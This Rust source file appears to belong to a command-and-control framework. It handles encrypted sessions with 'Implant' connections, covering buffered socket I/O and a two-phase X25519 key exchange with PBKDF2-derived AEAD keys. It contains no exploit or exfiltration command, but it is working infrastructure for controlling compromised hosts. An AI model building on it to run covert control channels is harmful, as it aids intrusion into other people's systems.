use super::Implant;

use std::{io::{Read, Write, ErrorKind}, num::NonZeroU32};
use libvoid::{enums::Protocol, errors::*};
use ring::{agreement, pbkdf2, digest, rand};

use log::error;

impl Implant {
    pub fn ready_to_send(&self) -> bool {
        self.writebuf.len() > 0
    }

    pub fn recv(&mut self) -> std::io::Result<usize> {
        match &mut self.stream {
            Some(stream) => {

                let mut final_buf = Vec::<u8>::new();
                let mut buf = [0u8; 1024];
                let mut bytes_read: usize = 0; 
                loop {
                    let cur_read = match stream.read(&mut buf) {
                        Ok(read) => read,
                        Err(e) => if e.kind() == ErrorKind::WouldBlock {
                            0
                        } else {
                            error!("Error in recv implant");
                            continue;
                        }
                    };
                    if cur_read == 0 { break; }
                    final_buf.append(&mut buf[..cur_read].to_vec());
                    bytes_read += cur_read;
                    buf = [0u8; 1024];
                }
                self.readbuf.append(&mut final_buf);
                if self.is_init && bytes_read > 0 {
                    self.readbuf = self.decrypt();
                }
                Ok(bytes_read)
            },
            None => Ok(0)
        }
    }

    pub fn send(&mut self) -> Result<usize, std::io::Error> {
        if self.is_init {
            self.encrypt();
        }
        match &mut self.stream {
            Some(stream) => {
                let res = stream.write(&self.writebuf[..])?;
                stream.flush()?;
                self.writebuf.clear();
                Ok(res)
            },
            None => Ok(0)
        }
    }

    pub fn write(&mut self, buf: &[u8]) {
        self.writebuf.append(&mut buf.to_vec());
    }

    pub fn kill(&mut self) {
        match &mut self.stream {
            Some(stream) => {
                stream.shutdown(std::net::Shutdown::Both).unwrap_or_default();
                self.stream = None;
            },
            None => ()
        };
    }

    fn encrypt(&mut self) {
        self.crypto.get_sealing_key().unwrap().seal_in_place_append_tag(ring::aead::Aad::empty(), &mut self.writebuf).unwrap()
    }

    fn decrypt(&mut self) -> Vec<u8> {
        self.crypto.get_opening_key().unwrap().open_in_place(ring::aead::Aad::empty(), &mut self.readbuf).unwrap().to_vec()
    }

    pub fn initiate(&mut self, phase: u8) -> ProtocolResult<()> {
        // First, let's create the phase1 seals
        let rng = rand::SystemRandom::new();
        let private_key = agreement::EphemeralPrivateKey::generate(&agreement::X25519, &rng).unwrap();
        let public_key = private_key.compute_public_key().unwrap();

        let nonce_seed: [u8; 12] = self.readbuf[..12].try_into().unwrap();
        self.readbuf.drain(0..12);

        let peer_public_key = ring::agreement::UnparsedPublicKey::new(
            &ring::agreement::X25519, 
            &self.readbuf[..]
        );

        let mut key = [0u8; digest::SHA256_OUTPUT_LEN];
            agreement::agree_ephemeral(
                private_key,
                &peer_public_key,
                ring::error::Unspecified,
                |key_material| {
                    // pbkdf2 is probably overkill as there's enough entropy in key_material already
                    // need to change that to HKDF or BLACK3 in KDF mode
                    Ok(pbkdf2::derive(
                        pbkdf2::PBKDF2_HMAC_SHA256, 
                        NonZeroU32::new(100_000).unwrap(), 
                        (self.get_addr_str() + format!("{}", phase).as_ref()).as_bytes(), 
                        key_material, 
                        &mut key
                    ))
                }
            ).unwrap();

        match phase {
            1 => self.crypto.set_sealing_key(key, nonce_seed),
            2 => self.crypto.set_opening_key(key, nonce_seed),
            _ => ()
        }

        // Now, send our public key for target can construct the key as well.
        let mut buf = Vec::<u8>::new();

        match phase {
            1 => buf.push(Protocol::ReturnPhase1Secret.value()),
            2 => buf.push(Protocol::ReturnPhase2Secret.value()),
            _ => return Err(ProtocolError::PhaseMismatch(phase))
        }

        buf.append( &mut public_key.as_ref().to_vec() );
        self.write(&buf);

        Ok(())
    }
}